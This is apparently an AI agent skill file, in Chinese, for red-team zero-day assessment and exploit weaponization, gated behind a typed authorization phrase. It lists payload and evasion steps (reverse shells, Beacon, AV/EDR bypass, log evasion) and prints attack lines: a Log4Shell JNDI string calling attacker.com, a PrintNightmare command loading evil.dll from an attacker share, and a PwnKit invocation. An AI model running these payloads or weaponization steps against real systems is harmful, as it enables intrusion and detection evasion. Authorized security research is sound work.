---
name: redteam-intrusion-0day
description: 0day漏洞审查。零日漏洞研究和利用可行性评估。当用户要求"0day分析"、"漏洞利用评估"、"Exploit开发"、"PoC分析"、"漏洞武器化"时使用此技能。仅限授权安全研究使用。
metadata:
  version: 1.0.0
  builtin: true
  category: redteam-intrusion
---

> ⚠️ **RED TEAM AUTHORIZATION REQUIRED**
>
> This skill falls under the `redteam:execute` capability gate.
>
> **Before executing ANY step in this skill, you MUST:**
> 1. State the skill name and a one-line summary of what you are about to do.
> 2. Ask the user to explicitly confirm authorization by typing **"已授权 / AUTHORIZED"**.
> 3. Ask the user to confirm the authorized scope (target, timeframe, rules of engagement).
> 4. Record the confirmation in your response before proceeding.
>
> **Do NOT proceed if:**
> - The user has not typed the authorization confirmation.
> - The target is outside the stated scope.
> - Any step would cause irreversible changes without a rollback plan.
>
> Violation of this gate is logged as a `security_alert` audit event.

---



# 0day漏洞审查

零日漏洞研究和利用可行性评估，用于红队作战和安全研究。

## 适用场景

**仅限授权研究**:
- 已知漏洞的利用评估
- 新披露漏洞的影响分析
- 红队定制化利用开发
- 安全研究和漏洞悬赏

## 漏洞分类

### 按漏洞类型

| 类型 | 代表漏洞 | 利用难度 |
|------|---------|---------|
| 内存破坏 | 缓冲区溢出、UAF | 高 |
| 逻辑漏洞 | 认证绕过、权限提升 | 中 |
| 注入漏洞 | SQL注入、命令注入 | 低 |
| 反序列化 | Java/PHP反序列化 | 中 |
| 配置缺陷 | 默认凭据、错误配置 | 低 |

### 按影响范围

| 范围 | 描述 | 价值 |
|------|------|------|
| 通用漏洞 | 影响广泛产品 | 极高 |
| 产品漏洞 | 特定产品 | 高 |
| 配置漏洞 | 特定环境 | 中 |

## 分析流程

### Phase 1: 漏洞情报

**信息收集**:
- CVE详情
- 厂商公告
- PoC/Exploit公开情况
- 补丁信息

**情报来源**:
| 来源 | 类型 | 及时性 |
|------|------|-------|
| NVD | 官方 | 中 |
| Exploit-DB | PoC | 快 |
| GitHub | PoC | 快 |
| Twitter/X | 讨论 | 最快 |
| 厂商公告 | 官方 | 中 |

### Phase 2: 技术分析

**漏洞成因**:
```markdown
## 漏洞分析

### 漏洞类型
[SQL注入 / RCE / 权限绕过等]

### 触发条件
1. [前置条件1]
2. [前置条件2]

### 漏洞代码
[关键代码片段分析]

### 利用链
[触发] → [绕过] → [执行] → [获权]
```

**利用条件评估**:
| 条件 | 要求 | 目标环境 |
|------|------|---------|
| 版本 | 1.0-2.0 | ✅ 符合 |
| 配置 | 默认配置 | ✅ 符合 |
| 权限 | 无需认证 | ✅ 符合 |
| 网络 | 可达目标端口 | ✅ 符合 |

### Phase 3: 利用评估

**可利用性评分**:

| 维度 | 评分(1-10) | 说明 |
|------|-----------|------|
| 稳定性 | X | 是否可靠触发 |
| 通用性 | X | 跨版本/环境 |
| 隐蔽性 | X | 日志/痕迹 |
| 复杂度 | X | 利用门槛 |

**CVSS评估**:
```
Attack Vector: Network
Attack Complexity: Low
Privileges Required: None
User Interaction: None
Scope: Changed
Confidentiality: High
Integrity: High
Availability: High

CVSS Score: 9.8 (Critical)
```

### Phase 4: PoC验证

**验证环境**:
```bash
# 搭建测试环境
docker run -d -p 8080:80 vuln-app:1.0

# 执行PoC
python exploit.py -t http://target:8080

# 验证结果
[+] Exploit successful
[+] Shell obtained
```

**PoC来源**:
| 来源 | 可靠性 | 风险 |
|------|-------|------|
| Exploit-DB | 高 | 低 |
| GitHub | 中 | 中 |
| Metasploit | 高 | 低 |
| 私有 | 不定 | 高 |

### Phase 5: 武器化

**定制化需求**:
- 载荷类型（反弹Shell/Beacon等）
- 规避需求（AV/EDR绕过）
- 稳定性要求
- 清理机制

**武器化checklist**:
- [ ] 修改默认特征
- [ ] 载荷加密/编码
- [ ] 添加退出/清理逻辑
- [ ] 错误处理
- [ ] 日志规避

## 常见漏洞利用

### Web RCE

**Log4Shell (CVE-2021-44228)**:
```
${jndi:ldap://attacker.com/exploit}
```

**Spring4Shell (CVE-2022-22965)**:
```http
POST /path HTTP/1.1
...
class.module.classLoader.resources.context.parent.pipeline...
```

### Windows提权

**PrintNightmare (CVE-2021-34527)**:
```powershell
# 检测
Get-Service -Name Spooler | Select Status

# 利用
SharpPrintNightmare.exe \\attacker\share\evil.dll
```

### Linux提权

**PwnKit (CVE-2021-4034)**:
```bash
# 检测
pkexec --version

# 利用
./pwnkit
```

## 输出规范

### 漏洞评估报告

```markdown
# 漏洞评估报告

## 基本信息
| 字段 | 值 |
|------|-----|
| CVE编号 | CVE-XXXX-XXXXX |
| 漏洞名称 | [名称] |
| 影响产品 | [产品版本] |
| 漏洞类型 | [类型] |
| CVSS评分 | X.X |

## 技术分析
[漏洞成因和利用链分析]

## 利用评估
| 维度 | 评估 |
|------|------|
| 可利用性 | 高/中/低 |
| 稳定性 | 高/中/低 |
| 武器化难度 | 高/中/低 |

## 目标适用性
[针对具体目标的评估]

## 利用建议
[红队场景下的使用建议]

## 检测规避
[已知检测方法和规避策略]
```

## 资源链接

### 漏洞数据库

| 资源 | 链接 | 用途 |
|------|------|------|
| NVD | nvd.nist.gov | 官方CVE |
| Exploit-DB | exploit-db.com | PoC |
| CVE Details | cvedetails.com | 统计分析 |

### 利用框架

| 框架 | 用途 |
|------|------|
| Metasploit | 综合利用 |
| Cobalt Strike | 红队作战 |
| Sliver | 开源C2 |

## 与其他技能的关联

| 场景 | 调用技能 | 说明 |
|------|---------|------|
| 漏洞扫描 | `/redteam-intrusion-hunter` | 批量发现 |
| 载荷制作 | `/redteam-lateral-evasion` | 免杀处理 |
| 权限提升 | `/redteam-privesc` | 后续提权 |
| 漏洞查询 | `/researching-vulnerabilities` | 情报收集 |